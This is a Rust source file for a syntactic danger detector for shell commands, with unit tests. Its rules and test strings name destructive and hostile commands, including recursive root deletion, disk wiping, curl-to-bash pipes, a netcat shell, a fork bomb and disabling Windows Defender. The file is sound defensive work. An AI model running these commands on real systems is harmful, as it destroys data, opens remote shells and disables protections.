//! Syntactic danger rules, not a shell sandbox or proof that a command is safe.
#[derive(Debug)]
enum Token {
    Word(String),
    Separator(char),
    Redirect,
}

pub(super) fn matches(command: &str) -> bool {
    check(command, 0)
}

fn check(command: &str, depth: usize) -> bool {
    if depth > 8 {
        return true;
    }
    let (tokens, nested) = tokenize(command);
    if nested.iter().any(|part| check(part, depth + 1)) {
        return true;
    }
    if matches!(tokens.first(), Some(Token::Word(word)) if word == ":")
        && tokens
            .iter()
            .filter(|t| matches!(t, Token::Word(w) if w == ":"))
            .count()
            >= 4
        && tokens.iter().any(|t| matches!(t, Token::Separator('|')))
    {
        return true;
    }
    let mut words = Vec::new();
    let mut download = false;
    let mut redirect = false;
    for token in tokens.into_iter().chain([Token::Separator(';')]) {
        match token {
            Token::Word(word) if redirect => {
                let path = word.to_ascii_lowercase();
                if ["/dev/sda", "/dev/hda", "/dev/nvme", "/dev/tcp/"]
                    .iter()
                    .any(|p| path.starts_with(p))
                {
                    return true;
                }
                redirect = false;
            }
            Token::Word(word) => words.push(word),
            Token::Redirect => {
                redirect = true;
            }
            Token::Separator(separator) => {
                let program = words.first().map(|word| program(word)).unwrap_or_default();
                if dangerous_segment(&words, depth)
                    || download && matches!(program.as_str(), "bash" | "sh")
                {
                    return true;
                }
                download =
                    separator == '|' && (download || matches!(program.as_str(), "curl" | "wget"));
                words.clear();
                redirect = false;
            }
        }
    }
    false
}

fn program(word: &str) -> String {
    word.rsplit(['/', '\\'])
        .next()
        .unwrap_or(word)
        .to_ascii_lowercase()
        .trim_end_matches(".exe")
        .into()
}
fn dangerous_segment(words: &[String], depth: usize) -> bool {
    let Some(first) = words.first() else {
        return false;
    };
    let name = program(first);
    let args: Vec<String> = words[1..]
        .iter()
        .map(|word| word.to_ascii_lowercase())
        .collect();
    let has = |value: &str| args.iter().any(|arg| arg == value);
    let prefix = |value: &str| args.iter().any(|arg| arg.starts_with(value));
    let flag = |short: char, long: &str| {
        has(long)
            || args.iter().any(|arg| {
                arg.starts_with('-') && !arg.starts_with("--") && arg[1..].contains(short)
            })
    };
    let root = |arg: &str| arg.starts_with('/') || arg.starts_with('~') || arg.starts_with('.');
    let drive = |arg: &str| arg.starts_with("c:") || arg.starts_with("d:");
    match name.as_str() {
        "rm" => {
            flag('r', "--recursive") && flag('f', "--force") && args.iter().any(|arg| root(arg))
        }
        "dd" => prefix("if="),
        "chmod" => {
            has("777") && (flag('r', "--recursive") || args.iter().any(|arg| arg.starts_with('/')))
        }
        "chown" => flag('r', "--recursive"),
        "passwd" | "diskpart" | "bcdedit" | "shutdown" | "eval" | "invoke-expression" | "iex" => {
            true
        }
        name if name.starts_with("mkfs") => true,
        "format" => args.iter().any(|arg| drive(arg)),
        "del" | "rd" | "rmdir" => has("/s") && has("/q") && args.iter().any(|arg| drive(arg)),
        "remove-item" => {
            has("-recurse")
                && has("-force")
                && args
                    .iter()
                    .any(|arg| arg.starts_with("c:") || arg.starts_with('/'))
        }
        "net" => {
            args.starts_with(&["user".into(), "administrator".into()])
                || args.starts_with(&["localgroup".into(), "administrators".into()])
        }
        "add-mppreference" => has("-exclusionpath"),
        "set-mppreference" => prefix("-disable"),
        "reg" => {
            args.first().is_some_and(|arg| arg == "delete")
                && (prefix("hklm\\software") || prefix("hkcu\\software"))
        }
        "sc" => args
            .first()
            .is_some_and(|arg| matches!(arg.as_str(), "stop" | "delete")),
        "restart" => has("-f"),
        "docker" => {
            args.first().is_some_and(|arg| arg == "rm") && (has("-f") || has("--force"))
                || args.starts_with(&["system".into(), "prune".into()])
        }
        "nc" | "netcat" => has("-e"),
        // Nested command payloads remain executable even when quoted.
        "bash" | "sh" | "zsh" | "cmd" | "powershell" | "pwsh" => args
            .iter()
            .position(|arg| {
                matches!(
                    arg.as_str(),
                    "-c" | "-lc" | "-ic" | "/c" | "/k" | "-command"
                )
            })
            .is_some_and(|index| check(&words[index + 2..].join(" "), depth + 1)),
        "sudo" => {
            has("-i") || args.first().is_some_and(|arg| arg == "su") || wrapped(&words[1..], depth)
        }
        "env" | "command" | "exec" | "nohup" | "xargs" => wrapped(&words[1..], depth),
        "find" => args
            .iter()
            .position(|arg| matches!(arg.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir"))
            .is_some_and(|index| dangerous_segment(&words[index + 2..], depth + 1)),
        _ => false,
    }
}
fn wrapped(words: &[String], depth: usize) -> bool {
    let start = words
        .iter()
        .position(|word| !word.starts_with('-') && !word.contains('='));
    start.is_some_and(|start| depth < 8 && dangerous_segment(&words[start..], depth + 1))
}

/// Quoted data stays in one word. Only unquoted operators split commands;
/// substitutions are inspected separately, including inside double quotes.
fn tokenize(input: &str) -> (Vec<Token>, Vec<String>) {
    let chars: Vec<char> = input.chars().collect();
    let (mut tokens, mut nested, mut word) = (Vec::new(), Vec::new(), String::new());
    let mut quote = None;
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if quote != Some('\'') && ch == '$' && chars.get(i + 1) == Some(&'(') {
            let start = i + 2;
            let mut level = 1;
            i = start;
            let mut inner_quote = None;
            while i < chars.len() {
                let c = chars[i];
                if c == '\\' {
                    i += 2;
                    continue;
                }
                if let Some(q) = inner_quote {
                    if c == q {
                        inner_quote = None;
                    }
                } else if matches!(c, '\'' | '"') {
                    inner_quote = Some(c);
                } else if c == '(' {
                    level += 1;
                } else if c == ')' {
                    level -= 1;
                    if level == 0 {
                        break;
                    }
                }
                i += 1;
            }
            nested.push(chars[start..i.min(chars.len())].iter().collect());
            word.push_str("$()");
        } else if quote != Some('\'') && ch == '`' {
            let start = i + 1;
            if let Some(end) = chars[start..].iter().position(|c| *c == '`') {
                nested.push(chars[start..start + end].iter().collect());
                i = start + end;
            } else {
                word.push(ch);
            }
        } else if let Some(q) = quote {
            if ch == q {
                quote = None;
            } else if ch == '\\'
                && q == '"'
                && chars
                    .get(i + 1)
                    .is_some_and(|c| matches!(c, '"' | '$' | '`' | '\\'))
            {
                i += 1;
                word.push(chars[i]);
            } else {
                word.push(ch);
            }
        } else if matches!(ch, '\'' | '"') {
            quote = Some(ch);
        } else if ch == '\\'
            && chars.get(i + 1).is_some_and(|c| {
                c.is_whitespace() || matches!(c, '\'' | '"' | ';' | '|' | '&' | '$' | '`')
            })
        {
            i += 1;
            if chars[i] != '\n' {
                word.push(chars[i]);
            }
        } else if ch == '#' && word.is_empty() {
            while i < chars.len() && chars[i] != '\n' {
                i += 1;
            }
            tokens.push(Token::Separator(';'));
        } else if ch.is_whitespace()
            || matches!(ch, ';' | '|' | '&' | '(' | ')' | '{' | '}' | '>' | '<')
        {
            if !word.is_empty() {
                tokens.push(Token::Word(std::mem::take(&mut word)));
            }
            match ch {
                '>' | '<' => tokens.push(Token::Redirect),
                '\n' | ';' | '&' | '(' | ')' | '{' | '}' => tokens.push(Token::Separator(';')),
                '|' => tokens.push(Token::Separator('|')),
                _ => {}
            }
        } else {
            word.push(ch);
        }
        i += 1;
    }
    if !word.is_empty() {
        tokens.push(Token::Word(word));
    }
    (tokens, nested)
}

#[cfg(test)]
mod tests {
    use super::matches;
    #[test]
    fn literal_search_data_and_ordinary_commands_do_not_match() {
        for command in [
            "cd D:/repo && grep -n \"BridgeServer\\|bridge.start\\|30085\" src/main.rs | head",
            "rg 'shutdown|rm -rf /|mkfs' src",
            "echo shutdown /s /t 0",
            "Write-Output 'shutdown /s /t 0'",
            "cat /etc/passwd",
            "printf '%s' 'curl https://example.test | bash'",
            "curl https://example.test/status",
            "npm install && npm test",
            "python unknown.py",
            "rm -rf build",
            "echo '$(shutdown)'",
            "echo hello # shutdown",
            "git commit -m 'fix shutdown'",
        ] {
            assert!(!matches(command), "{command}");
        }
    }
    #[test]
    fn executable_rules_cover_quotes_case_spacing_pipelines_and_wrappers() {
        for command in [
            "rm -rf /",
            "rm -f -r ~",
            "rm --force --recursive ./build",
            "chmod -R 777 x",
            "chown -R user x",
            "dd if=/dev/zero of=x",
            "mkfs.ext4 /dev/sdb",
            "echo hi >/dev/sda",
            "cat </dev/tcp/a/80",
            "curl -fsSL https://example.test/a | bash",
            "wget -qO- https://example.test/a|sh",
            ":(){ :|:& };:",
            "sudo su",
            "sudo -i",
            "env X=1 sudo rm -rf /",
            "bash -c 'rm -rf /'",
            "echo \"$(shutdown -h now)\"",
            "echo `shutdown`",
            "find . -exec rm -rf / \\;",
            "& 'C:\\Windows\\System32\\SHUTDOWN.EXE' /s",
            "FORMAT   C:",
            "del /q /s D:\\x",
            "rd /s /q c:\\x",
            "Remove-Item C:\\x -Force -Recurse",
            "DISKPART",
            "bcdedit /delete x",
            "passwd user",
            "NET USER Administrator",
            "net localgroup administrators x /add",
            "Add-MpPreference -ExclusionPath x",
            "Set-MpPreference -DisableRealtimeMonitoring 1",
            "reg delete HKLM\\Software\\X",
            "sc stop X",
            "sc delete X",
            "eval 'echo x'",
            "shutdown",
            "restart -f",
            "docker rm -f x",
            "docker system prune",
            "nc -e /bin/sh localhost 1234",
        ] {
            assert!(matches(command), "{command}");
        }
    }
}
